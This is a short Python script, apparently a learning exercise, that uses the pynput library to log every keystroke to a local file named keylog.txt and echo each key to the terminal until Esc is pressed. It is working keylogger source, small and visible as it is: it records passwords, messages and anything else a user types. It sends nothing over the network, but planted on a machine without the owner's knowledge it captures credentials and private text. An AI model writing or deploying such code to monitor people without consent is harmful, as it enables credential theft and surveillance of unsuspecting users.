from pynput import keyboard

LOG_FILE = "keylog.txt"

# Debug message
print("Keylogger Started... Press 'Esc' to stop.")

def on_press(key):
    try:
        char = key.char  # Normal character keys
    except AttributeError:
        char = f"[{key}]"  # Special keys (Enter, Shift, etc.)

    print(f"Key Pressed: {char}")  # Print to terminal for debugging

    # Save to file
    with open(LOG_FILE, "a") as f:
        f.write(char)

def on_release(key):
    if key == keyboard.Key.esc:  # Stop logging when 'Esc' is pressed
        print("\nKeylogger Stopped.")  # Print message before exiting
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
